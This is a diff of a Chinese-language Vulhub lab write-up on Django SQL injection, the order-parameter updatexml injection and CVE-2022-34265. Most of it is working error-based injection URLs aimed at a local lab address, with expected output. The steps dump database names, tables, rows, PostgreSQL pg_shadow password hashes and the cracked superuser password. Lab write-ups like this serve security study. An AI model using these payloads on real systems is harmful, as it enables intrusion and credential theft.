@@ -7,7 +7,7 @@ tags:
   - Vulhub
   - CVE
 category: Vulhub靶场
-draft: true
+draft: false
 pinned: false
 lang: zh-CN
 author: Ynm
@@ -213,65 +213,135 @@ http://192.168.197.88:8000/vuln/?order=vuln_collection.name);select updatexml(1,
 ![](images/Pasted%20image%2020261105111315.png)
 后续所有Payload都基于以下基础模板构造：  
 `http://192.168.197.88:8000/vuln/?order=vuln_collection.name);select updatexml(1, concat(0x7e, (<你的子查询>), 0x7e), 1)%23`
-#### 1. 获取数据库版本
-获取当前数据库的版本信息。
+1. **获取数据库版本**
+
 ```text wrap
 http://192.168.197.88:8000/vuln/?order=vuln_collection.name);select%20updatexml(1,%20concat(0x7e,(select%20@@version),0x7e),1)%23
 ```
-**预期报错**：`XPATH syntax error: '~8.0.xx~'`
+**预期报错**：`XPATH syntax error: '~x.x.xx~'`
+![](images/Pasted%20image%2020261114114359.png)
+2. **获取当前数据库名**
 
-#### 2. 获取当前数据库名
-获取当前连接的数据库名称。
 ```text wrap
 http://192.168.197.88:8000/vuln/?order=vuln_collection.name);select%20updatexml(1,%20concat(0x7e,(select%20database()),0x7e),1)%23
 ```
-**预期报错**：`XPATH syntax error: '~vuln~'` (或实际的库名)
+**预期报错**：`XPATH syntax error: '~cve~'`
+![](images/Pasted%20image%2020261114114507.png)
+3. **获取当前数据库用户**
 
-#### 3. 获取当前数据库用户
-获取当前连接数据库的系统用户。
 ```text wrap
 http://192.168.197.88:8000/vuln/?order=vuln_collection.name);select%20updatexml(1,%20concat(0x7e,(select%20user()),0x7e),1)%23
 ```
 **预期报错**：`XPATH syntax error: '~root@localhost~'`
+![](images/Pasted%20image%2020261114114609.png)
+4. **获取当前数据库中的所有表名**
 
-#### 4. 获取当前数据库中的所有表名
 查询 `information_schema.tables` 来获取当前数据库下的所有表。
 ```text wrap
 http://192.168.197.88:8000/vuln/?order=vuln_collection.name);select%20updatexml(1,%20concat(0x7e,(select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()),0x7e),1)%23
 ```
 **预期报错**：`XPATH syntax error: '~auth_group,auth_permission,auth_user,...~'` (表名列表)
+![](images/Pasted%20image%2020261114114707.png)
 
-#### 5. 获取指定表（如 `auth_user`）的列名
-查询 `information_schema.columns` 来获取 `auth_user` 表的所有列名。
+5. **获取 vuln_collection 表的列名**
+
+利用 `information_schema.columns` 查询现有表的列名：
 ```text wrap
-http://192.168.197.88:8000/vuln/?order=vuln_collection.name);select%20updatexml(1,%20concat(0x7e,(select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_name='auth_user'),0x7e),1)%23
+http://192.168.197.88:8000/vuln/?order=vuln_collection.name);select%20updatexml(1,%20concat(0x7e,(select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_name='vuln_collection'),0x7e),1)%23
 ```
-**预期报错**：`XPATH syntax error: '~id,password,last_login,is_superuser,username,...~'` (列名列表)
+**预期报错**：`XPATH syntax error: '~id,name~'` （具体列名以实际回显为准）。
 
-#### 6. 提取管理员账号和密码哈希
-从 `auth_user` 表中提取 `username` 和 `password` 字段。由于 `updatexml` 报错长度有限（约32字符），若哈希较长，可使用 `substring` 分次提取。
+*注：如果列名比较多超过 32 个字符被截断了，可以用 `limit 0,1` 一个个查，或者用`substring(group_concat(column_name),1,32)` 分段看。*
+
+![](images/Pasted%20image%2020261114115106.png)
+6. **提取 vuln_collection 表中的业务数据**
+
+根据上一步查到列名有 `id`、`name`，我们尝试把第一行的数据提取出来。
+
 ```text wrap
-http://192.168.197.88:8000/vuln/?order=vuln_collection.name);select%20updatexml(1,%20concat(0x7e,(select%20concat(username,0x3a,substring(password,1,32))%20from%20auth_user%20limit%200,1),0x7e),1)%23
+http://192.168.197.88:8000/vuln/?order=vuln_collection.name);select%20updatexml(1,%20concat(0x7e,(select%20concat(id,0x3a,name)%20from%20vuln_collection%20limit%200,1),0x7e),1)%23
 ```
-**预期报错**：`XPATH syntax error: '~admin:pbkdf2_sha256$150000$...~'`
+> **预期报错**：`XPATH syntax error: '~1:Example 1~'`
 
-
-
-
-
-
-
-
+![](images/Pasted%20image%2020261114115149.png)
+至此已经得到数据库中的数据，后续也可以进一步获取其他数据，这里不再演示。
 ### 6. CVE-2022-34265（Trunc/Extract SQL 注入）
-**漏洞原理**：
-Django 提供的数据库函数 `Trunc()` 和 `Extract()` 用于处理日期和时间提取。如果开发者将用户输入作为这两个函数的 `kind`（类型）或 `lookup_name` 参数传入，Django 未对其进行安全过滤就拼接到了数据库执行。攻击者通过传入包含单引号等特殊字符的参数，即可突破原有查询逻辑，实现报错注入。
 
-**复现步骤**：
-该应用使用 `Trunc` 函数按时间聚合数据。修改 `date` 参数注入恶意单引号：
-```text wrap
-http://192.168.197.88:8000/?date=xxxx'xxxx
+**漏洞原理**：
+Django 提供的数据库函数 `Trunc()` 和 `Extract()` 用于处理日期和时间提取。如果开发者将用户输入作为这两个函数的 `kind` 参数传入，Django 未对其进行安全过滤就拼接到了数据库执行。攻击者通过传入包含特殊字符的参数，即可突破原有查询逻辑，实现报错注入。
+
+**注入点分析与踩坑记录**：
+该应用使用 `Trunc` 函数按时间聚合数据。当我们传入 `?date=xxxx'xxxx` 时，Django 抛出了错误，并在调试页面给出了底层 SQL 语句：
+![](images/Pasted%20image%2020261114134556.png)
+```sql wrap
+SELECT DATE_TRUNC('<K>', "vuln_weblog"."created_time") AS "time",
+       COUNT("vuln_weblog"."id") AS "count"
+FROM "vuln_weblog"
+GROUP BY DATE_TRUNC('<K>', "vuln_weblog"."created_time")
+ORDER BY "time" DESC
 ```
-Django 抛出数据库 OperationalError，证明 `date` 参数被拼接入 SQL 语句并导致了注入。
+**关键点**：同一段 `<K>` 在 `SELECT` 和 `GROUP BY` 中出现了两次。如果我们像常规注入那样用 `minute') AND 1=CAST(...)--` 提前闭合 `DATE_TRUNC` 函数，会导致后面的 `, "vuln_weblog"."created_time")` 解析失败（报错 `syntax error at or near ")"`）。
+
+**正确的 Payload 构造**：
+为了保持原有函数结构不破坏，正确做法是把子查询利用字符串拼接符 `||` 直接拼进第一个参数字符串中：
+```sql wrap
+year'||('x'||(SELECT <SQL>))::int||'
+```
+代入后端后，SQL 变为：
+```sql wrap
+DATE_TRUNC('year'||('x'||(SELECT <SQL>))::int||'', "vuln_weblog"."created_time")
+```
+在 PostgreSQL 中，子查询结果前加上哨兵字符 `x`，再通过 `::int` 强制类型转换，必然触发报错，异常信息中就会带出我们查询的数据。
+
+**① 获取数据库版本**
+```text wrap
+http://192.168.197.88:8000/?date=year%27%7C%7C%28%27x%27%7C%7C%28SELECT%20version%28%29%29%29%3A%3Aint%7C%7C%27
+```
+> **预期报错回显**：`invalid input syntax for type integer: "xPostgreSQL 13.23 ..."`
+
+![](images/Pasted%20image%2020261114134959.png)
+**② 获取当前库名与用户**
+```text wrap
+http://192.168.197.88:8000/?date=year%27%7C%7C%28%27x%27%7C%7C%28SELECT%20current_database%28%29%7C%7C%27%2F%27%7C%7Ccurrent_user%29%29%3A%3Aint%7C%7C%27
+```
+> **预期报错回显**：`invalid input syntax for type integer: "xCVE_2022_34265/postgres"`
+
+![](images/Pasted%20image%2020261114135101.png)
+**③ 获取当前库的所有表名**
+```text wrap
+http://192.168.197.88:8000/?date=year%27%7C%7C%28%27x%27%7C%7C%28SELECT%20string_agg%28table_name%2C%27%2C%27%29%20FROM%20information_schema.tables%20WHERE%20table_schema%3D%27public%27%29%29%3A%3Aint%7C%7C%27
+```
+> **预期报错回显**：`invalid input syntax for type integer: "xdjango_migrations,vuln_weblog"`
+
+![](images/Pasted%20image%2020261114135156.png)
+**④ 获取 vuln_weblog 表的列名**
+```text wrap
+http://192.168.197.88:8000/?date=year%27%7C%7C%28%27x%27%7C%7C%28SELECT%20string_agg%28column_name%2C%27%2C%27%29%20FROM%20information_schema.columns%20WHERE%20table_name%3D%27vuln_weblog%27%29%29%3A%3Aint%7C%7C%27
+```
+> **预期报错回显**：`invalid input syntax for type integer: "xid,method,url,user_agent,created_time"`
+
+![](images/Pasted%20image%2020261114135222.png)
+**⑤ 提取业务数据（利用 row_to_json 一次拉取整行）**
+
+PostgreSQL 中可以直接将整行数据转为 JSON 字符串，然后用 `OFFSET` 和 `LIMIT` 获取指定行。
+```text wrap
+http://192.168.197.88:8000/?date=year%27%7C%7C%28%27x%27%7C%7C%28SELECT%20row_to_json%28t%29%3A%3Atext%20FROM%20%28SELECT%20%2A%20FROM%20vuln_weblog%20ORDER%20BY%20id%20OFFSET%200%20LIMIT%201%29%20t%29%29%3A%3Aint%7C%7C%27
+```
+> **预期报错回显**：`invalid input syntax for type integer: "x{"id":1,"method":"GET","url":"http://192.168.197.88:8000/",...}"`
+> *(要读取下一行，只需将 `OFFSET 0` 改为 `OFFSET 1`)*
+
+![](images/Pasted%20image%2020261114135440.png)
+**⑥ 提取数据库账号密码（PostgreSQL 专属）**
+
+查询 PostgreSQL 的 `pg_shadow` 系统表，提取数据库用户及 MD5 密码哈希：
+```text wrap
+http://192.168.197.88:8000/?date=year%27%7C%7C%28%27x%27%7C%7C%28SELECT%20string_agg%28usename%7C%7C%27%3A%27%7C%7Ccoalesce%28passwd%2C%27%28null%29%27%29%2C%27%20%7C%20%27%29%20FROM%20pg_shadow%29%29%3A%3Aint%7C%7C%27
+```
+> **预期报错回显**：`invalid input syntax for type integer: "xpostgres:md53175bce1d3201d16594cebf9d7eb3f9d"`
+> 
+> **解密**：该 MD5 值为 `md5(postgres + postgres)`，即数据库管理员账号密码均为 `postgres`，权限极高，为超级用户。
+
+![](images/Pasted%20image%2020261114135532.png)
 
 ---
 ## 三、漏洞原理总结
